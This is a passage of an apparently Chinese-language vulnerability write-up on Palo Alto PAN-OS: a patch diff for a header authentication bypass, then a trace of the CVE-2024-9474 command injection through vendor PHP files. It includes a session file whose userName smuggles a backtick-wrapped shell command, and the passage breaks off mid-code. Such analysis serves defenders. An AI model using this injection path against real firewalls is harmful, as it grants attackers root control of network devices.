<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>添加了<code>X-PAN-AUTHCHECK: on</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add_header Allow &quot;GET, HEAD, POST, PUT, DELETE, OPTIONS&quot;;</span><br><span class="line"> if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) &#123;</span><br><span class="line">   return 405;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+proxy_set_header X-Real-IP &quot;&quot;;</span><br><span class="line">+proxy_set_header X-Real-Scheme &quot;&quot;;</span><br><span class="line">+proxy_set_header X-Real-Port &quot;&quot;;</span><br><span class="line">+proxy_set_header X-Real-Server-IP &quot;&quot;;</span><br><span class="line">+proxy_set_header X-Forwarded-For  &quot;&quot;;</span><br><span class="line">+proxy_set_header X-pan-ndpp-mode &quot;&quot;;</span><br><span class="line">+proxy_set_header Proxy &quot;&quot;;</span><br><span class="line">+proxy_set_header X-pan-AuthCheck &#x27;on&#x27;;</span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">rewrite_log on;</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">static ones</span></span><br><span class="line">@@ -27,6 +17,5 @@ location /nginx_status &#123;</span><br><span class="line"> location ~ \.js\.map$ &#123;</span><br><span class="line">   add_header Cache-Control &quot;no-cache; no-store&quot;;</span><br><span class="line">   proxy_pass_header Authorization;</span><br><span class="line">+  include conf/proxy_default.conf;</span><br><span class="line">   proxy_pass http://$gohost$gohostExt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM117" alt="img"></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM118" alt="img"></p>
<h2 id="CVE-2024-9474"><a href="#CVE-2024-9474" class="headerlink" title="CVE-2024-9474"></a>CVE-2024-9474</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Palo Alto Networks PAN-OS </code>软件中存在一个权限提升漏洞，使得有权访问管理 <code>Web</code> 界面的 <code>PAN-OS</code> 管理员能够使用 root 权限在防火墙上执行作。</p>
<p>此问题适用于 <code>PA</code> 系列、<code>VM</code> 系列和 <code>CN</code> 系列防火墙以及 <code>Panorama</code>（虚拟和 <code>M</code> 系列）和 <code>WildFire</code> 设备上的 <code>PAN-OS 10.1</code>、<code>PAN-OS 10.2</code>、<code>PAN-OS 11.0</code>、<code>PAN-OS 11.1</code> 和 <code>PAN-OS 11.2</code> 软件。</p>
<p><code>Cloud NGFW</code> 和 <code>Prisma Access</code> 不受此漏洞的影响。</p>
<h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p><img src="/images/image-20250223192327631.png" alt="image-20250223192327631"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php</code>文件中，存在一个很明显的命令执行漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="comment"># cat /var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">panui_core</span>\<span class="title class_">log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">InjectableClass</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_process</span>\<span class="title">Process</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_process</span>\<span class="title">ShellSanitizer</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuditLog</span> <span class="keyword">extends</span> <span class="title">InjectableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> ShellSanitizer */</span></span><br><span class="line">    <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">ShellSanitizer</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$message</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Process */</span></span><br><span class="line">    <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">Process</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">pexecute</span>(<span class="string">&quot;/usr/local/bin/pan_elog -u audit -m <span class="subst">$msg</span> -o <span class="subst">$username</span>&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>var/appweb/htdocs/php-packages/pan_process/src/Process.php</code>文件中进行命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pexecute</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">elapsed</span>(<span class="string">&quot;<span class="subst">$cmd</span> starts&quot;</span>);</span><br><span class="line">    <span class="variable">$descriptors</span> = [</span><br><span class="line">      <span class="number">0</span> =&gt; [<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;r&#x27;</span>], <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">      <span class="number">1</span> =&gt; [<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>], <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">      <span class="number">2</span> =&gt; [<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;/dev/null&#x27;</span>, <span class="string">&#x27;w&#x27;</span>], <span class="comment">// stderr is a file to write to</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$cmd</span>, <span class="variable">$descriptors</span>, <span class="variable">$pipes</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stdout</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">elapsed</span>(<span class="string">&quot;<span class="subst">$cmd</span> ends - code: <span class="subst">$code</span> stdout: <span class="subst">$stdout</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">      <span class="string">&#x27;code&#x27;</span> =&gt; <span class="variable">$code</span>,</span><br><span class="line">      <span class="string">&#x27;stdout&#x27;</span> =&gt; <span class="variable">$stdout</span>,</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>分析<code>/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php</code>文件中的<code>write</code>函数调用，定位到了<code>var/appweb/htdocs/php-packages/panui_core/src/tracking/AdminActivity.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">panui_core</span>\<span class="title class_">tracking</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">Container</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">InjectableTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">panui_core</span>\<span class="title">http</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">panui_core</span>\<span class="title">log</span>\<span class="title">AuditLog</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">panui_core</span>\<span class="title">log</span>\<span class="title">SysLog</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@remotable</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">InjectableTrait</span>;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">accessTab</span>(<span class="params"><span class="variable">$target</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">self</span>::<span class="title function_ invoke__">isValidTabName</span>(<span class="variable">$target</span>)) <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable constant_">FAIL_RESPONSE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Session */</span></span><br><span class="line">    <span class="variable">$session</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">Session</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$session</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">    <span class="variable">$sys</span> = <span class="variable">$target</span> === <span class="string">&#x27;monitor&#x27;</span></span><br><span class="line">      ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeSysLog</span>(<span class="variable">$username</span>, <span class="string">&quot;tab: <span class="subst">$target</span>&quot;</span>)</span><br><span class="line">      : <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$audit</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeAuditLog</span>(<span class="variable">$username</span>, <span class="string">&quot;tab: <span class="subst">$target</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sys</span> &amp;&amp; <span class="variable">$audit</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;@status&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;@code&#x27;</span> =&gt; <span class="string">&#x27;19&#x27;</span></span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span> = [</span><br><span class="line">      <span class="string">&#x27;@status&#x27;</span> =&gt; <span class="string">&#x27;failure&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$sys</span> &amp;&amp; !<span class="variable">$audit</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="title function_ invoke__">_T</span>(<span class="string">&quot;Could not generate system logs for accessing Monitor tab and audit tracking logs.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="variable">$sys</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="title function_ invoke__">_T</span>(<span class="string">&quot;Could not generate system logs for accessing Monitor tab.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="variable">$audit</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="title function_ invoke__">_T</span>(<span class="string">&quot;Could not generate audit tracking logs.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@remotable</span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">accessNode</span>(<span class="params"><span class="variable">$target</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">self</span>::<span class="title function_ invoke__">isValidNodeName</span>(<span class="variable">$target</span>)) <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable constant_">FAIL_RESPONSE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Session */</span></span><br><span class="line">    <span class="variable">$session</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">Session</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$session</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">    <span class="variable">$success</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeAuditLog</span>(<span class="variable">$username</span>, <span class="string">&quot;node: <span class="subst">$target</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$success</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;@status&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;@code&#x27;</span> =&gt; <span class="string">&#x27;19&#x27;</span></span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">      <span class="string">&#x27;@status&#x27;</span> =&gt; <span class="string">&#x27;failure&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="title function_ invoke__">_T</span>(<span class="string">&quot;Could not generate audit tracking logs.&quot;</span>)</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">writeAuditLog</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$target</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> AuditLog */</span></span><br><span class="line">    <span class="variable">$auditLog</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">AuditLog</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$auditLog</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$username</span>, <span class="string">&quot;User <span class="subst">$username</span> accessed <span class="subst">$target</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>[<span class="string">&#x27;code&#x27;</span>] === <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析<code>$username</code>的传参，再跟进<code>/var/appweb/htdocs/php-packages/panui_core/src/http/Session.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="comment"># cat /var/appweb/htdocs/php-packages/panui_core/src/http/Session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">panui_core</span>\<span class="title class_">http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">InjectableClass</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_fs</span>\<span class="title">FS</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_http</span>\<span class="title">Cookie</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_http</span>\<span class="title">Server</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_http</span>\<span class="title">Session</span> <span class="keyword">as</span> <span class="title">HttpSession</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">panui_core</span>\<span class="title">mgmt</span>\<span class="title">ResponseFormatter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">panui_core</span>\<span class="title">mgmt</span>\<span class="title">XmlRequest</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@internal</span> `panui_core\http\Session` is not inherited from `pan_http\Session`.</span></span><br><span class="line"><span class="comment"> * Because it is often used directly, so it is a typical subject of `overrideSpec()`.</span></span><br><span class="line"><span class="comment"> * That means it needs to reference the external dependency (`pan_http\Session`)</span></span><br><span class="line"><span class="comment"> * so that the `RemoteSpec` can capture the calls.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">InjectableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$session</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getHttpSession</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$session</span>-&gt;&#123;<span class="variable">$name</span>&#125;(...<span class="variable">$args</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> HttpSession</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getHttpSession</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">HttpSession</span>::<span class="variable language_">class</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>/var/appweb/htdocs/php-packages/panui_core/src/http/Session.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="comment"># cat ./var/appweb/htdocs/php-packages/pan_http/src/Session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For Session, I cannot inherit from `SuperGlobalWrapper`.</span></span><br><span class="line"><span class="comment"> * `$_SESSION` does not exist until `session_start()` is called,</span></span><br><span class="line"><span class="comment"> * and during IoC, it is not called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">pan_http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Closure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">Container</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Encapsulate the $_SESSION super global,</span></span><br><span class="line"><span class="comment"> * and PHP session management functions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> $key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$key</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> $key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> null|string|array</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exists</span>(<span class="variable">$key</span>) ? <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] : <span class="variable">$default</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>综上，在<code>/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php</code>文件中<code>$username</code>参数来自于<code>sess_id</code>文件里面的<code>$username</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM phpsessions]<span class="comment"># cat sess_okli6j1220bal4mgngs2nihjst</span></span><br><span class="line">cmsRemoteSession|s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;panorama_sessionid|s:<span class="number">5</span>:<span class="string">&quot;dummy&quot;</span>;user|s:<span class="number">16</span>:<span class="string">&quot;4729754977522173&quot;</span>;userName|s:<span class="number">4</span>:<span class="string">&quot;`id`&quot;</span>;userRole|s:<span class="number">9</span>:<span class="string">&quot;superuser&quot;</span>;vsys|s:<span class="number">5</span>:<span class="string">&quot;vsys1&quot;</span>;editShared|N;numRulphperPage|s:<span class="number">2</span>:<span class="string">&quot;25&quot;</span>;model|s:<span class="number">5</span>:<span class="string">&quot;PA-VM&quot;</span>;family|s:<span class="number">2</span>:<span class="string">&quot;vm&quot;</span>;serialNo|s:<span class="number">7</span>:<span class="string">&quot;unknown&quot;</span>;version|s:<span class="number">6</span>:<span class="string">&quot;11.0.1&quot;</span>;isCms|s:<span class="number">2</span>:<span class="string">&quot;no&quot;</span>;dloc|s:<span class="number">23</span>:<span class="string">&quot;8:localhost.localdomain&quot;</span>;loc|s:<span class="number">30</span>:<span class="string">&quot;16:localhost.localdomain:vsys1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>分析<code>/var/appweb/htdocs/php/utils/createRemoteAppwebSession.php</code>文件，发现可以创建一个<code>sess_id</code>的文件，并且<code>user</code>可控</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@PA-VM /]<span class="comment"># cat /var/appweb/htdocs/php/utils/createRemoteAppwebSession.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">WebSession</span>::<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span 